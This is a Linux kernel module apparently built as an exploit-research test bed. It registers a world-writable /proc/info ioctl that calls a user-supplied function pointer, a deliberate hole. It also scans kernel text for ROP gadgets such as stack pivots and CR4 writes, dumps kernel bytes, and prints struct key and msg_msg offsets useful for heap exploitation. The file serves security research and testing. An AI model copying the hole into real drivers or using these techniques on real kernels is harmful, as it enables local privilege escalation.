#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/key.h>
#include <linux/key-type.h>
#include <linux/msg.h>
#include <linux/syscalls.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/proc_fs.h>

#define KERNEL_SEARCH_START (0xffffffff81000000UL)
#define KERNEL_SEARCH_END   (0xffffffff81800000UL)

/* 
 * Stack pivot candidate
 *
 * - ffffffff81405ba0
 */

struct info_test_st {
	void (*call_fp)(void *);
	char dummy[168]; /* STRUCT_KEY_LEN(176) - 8(call_fp) */
};

struct info_arg {
	void *call;
	void *arg1;
};

void info_wrapper(void)
{
	asm volatile(" \n\
	payload: \n\
		mov %%rax,%%cr4 \n\
		ret \n\
	" ::: );
}

void enable_smap(void)
{
	asm volatile(" \n\
		movq $0x2407e0,%%rdx \n\
		movq %%rdx,%%cr4 \n\ " ::: );
}

static struct info_test_st *tst = NULL;

static long info_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
	struct info_arg iarg;
	
	pr_info("info_ioctl : %d, %lx\n", cmd, arg);

	if (copy_from_user(&iarg, (void *)arg, sizeof(iarg))) {
		pr_info("copy_from_user error\n");
		return -EFAULT;
	}
	
	tst = kmalloc(sizeof(struct info_test_st), GFP_KERNEL);
	pr_info("addr - tst : %lx\n", (unsigned long)tst);

	//enable_smap();

	/* sample vulnerability for testing */
	tst->call_fp = iarg.call;
	tst->call_fp(iarg.arg1);
	return 0;
}

static struct file_operations info_fops =
{
    .owner = THIS_MODULE,
    .unlocked_ioctl = info_ioctl,
};

static int create_info_fops(void)
{
    proc_create("info", 0666, NULL, &info_fops);
    pr_info("size info_test_st : %ld\n", sizeof(struct info_test_st));
    return 0;
}

static int remove_info_fops(void)
{
    remove_proc_entry("info", NULL);
    return 0;
}

/* Search stack pivot, ROP gadgets */
static void search_stack_pivot(void)
{
	unsigned long addr;
	unsigned char *ptr;
	
	int xchg_eax_esp_ret = 0;
	int pop_rdi_ret = 0;
	int mov_eax_dword_ptr_rdi_ret = 0;
	int pop_rcx_ret = 0;
	int pop_rax_ret = 0;
	int mov_rax_cr4_ret = 0;
	int jmp_rcx = 0;
	int nop_ret = 0;
	
	for (addr = KERNEL_SEARCH_START; addr < KERNEL_SEARCH_END - 6; addr += 1) {
		ptr = (unsigned char *)addr;

		if (ptr[0] == 0x94 && ptr[1] == 0xc3 && xchg_eax_esp_ret == 0) {
			pr_info("xchg_eax_esp_ret : %lx\n", addr);
			xchg_eax_esp_ret = 1;
			continue;
		}
		if (ptr[0] == 0x5f && ptr[1] == 0xc3 && pop_rdi_ret == 0) {
			pr_info("pop_rdi_ret : %lx\n", addr);
			pop_rdi_ret = 1;
			continue;
		}
		if (ptr[0] == 0x89 && ptr[1] == 0x07 && ptr[2] == 0xc3 && mov_eax_dword_ptr_rdi_ret == 0) {
			pr_info("mov_eax_dword_ptr_rdi_ret : %lx\n", addr);
			mov_eax_dword_ptr_rdi_ret = 1;
			continue;
		}
		if (ptr[0] == 0x59 && ptr[1] == 0xc3 && pop_rcx_ret == 0) {
			pr_info("pop_rcx_ret : %lx\n", addr);
			pop_rcx_ret = 1;
			continue;
		}
		if (ptr[0] == 0x58 && ptr[1] == 0xc3 && pop_rax_ret == 0) {
			pr_info("pop_rax_ret : %lx\n", addr);
			pop_rax_ret = 1;
			continue;
		}
		if (ptr[0] == 0x0f && ptr[1] == 0x22 &&  ptr[2] == 0xe0 && ptr[3] == 0xc3 && mov_rax_cr4_ret == 0) {
			pr_info("mov_rax_cr4_ret : %lx\n", addr);
			mov_rax_cr4_ret = 1;
			continue;
		}
		if (ptr[0] == 0xff && ptr[1] == 0xe1 && jmp_rcx == 0) {
			pr_info("jmp_rcx : %lx\n", addr);
			jmp_rcx = 1;
			continue;
		}
		if (ptr[0] == 0x90 && ptr[1] == 0xc3 && nop_ret == 0) {
			pr_info("nop_ret : %lx\n", addr);
			nop_ret = 1;
			continue;
		}
	}
}

//static void dump_key_revoke(void)
static void dump_kernel(unsigned char *start, unsigned char *end)
{
	/* We have to know which register is used to store revoke() */
	/* It's to calculate perfect fake stack location */
	//unsigned char *key_revoke = (unsigned char *)0xffffffff812c91f0UL;
	//unsigned char *key_revoke_end = (unsigned char *)0xffffffff812c97c0UL;
	unsigned char *ptr;

	for (ptr = start; ptr < end - 16; ptr += 16) {
		pr_info("%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
				ptr[0], ptr[1], ptr[2], ptr[3], ptr[4], ptr[5], ptr[6], 
				ptr[7], ptr[8], ptr[9], ptr[10], ptr[11], ptr[12], ptr[13], ptr[14], ptr[15]);
	}
}

static int info_init(void)
{
	struct key k;
	struct key_type kt;

	pr_info("struct key size : %ld\n", sizeof(k));
	pr_info("offset - uid : %ld\n", (unsigned long)(&k.uid) - (unsigned long)(&k));
	pr_info("offset - gid : %ld\n", (unsigned long)(&k.gid) - (unsigned long)(&k));
	pr_info("offset - perm : %ld\n", (unsigned long)(&k.perm) - (unsigned long)(&k));
	pr_info("offset - flags : %ld\n", (unsigned long)(&k.flags) - (unsigned long)(&k));
	pr_info("offset - type : %ld\n", (unsigned long)(&k.type) - (unsigned long)(&k));
	pr_info("offset - description : %ld\n", (unsigned long)(&k.description) - (unsigned long)(&k));
	pr_info("offset - payload : %ld\n", (unsigned long)(&k.payload) - (unsigned long)(&k));
	pr_info("offset - payload.data : %ld\n", (unsigned long)(&k.payload.data) - (unsigned long)(&k));

	pr_info("struct msg_msg size : %ld\n", sizeof(struct msg_msg));
	pr_info("struct key_type size : %ld\n", sizeof(kt));
	pr_info("offset - revoke : %ld\n", (unsigned long)&kt.revoke - (unsigned long)(&kt));

	pr_info("struct sembuf size : %ld\n", sizeof(struct sembuf));
	
	create_info_fops();
	search_stack_pivot();
	dump_kernel(0xffffffff81000000UL, 0xffffffff81000100UL);
	//dump_key_revoke();
	return 0;
}

static void info_exit(void)
{
	remove_info_fops();
	return;
}

module_init(info_init);
module_exit(info_exit);
MODULE_LICENSE("GPL");
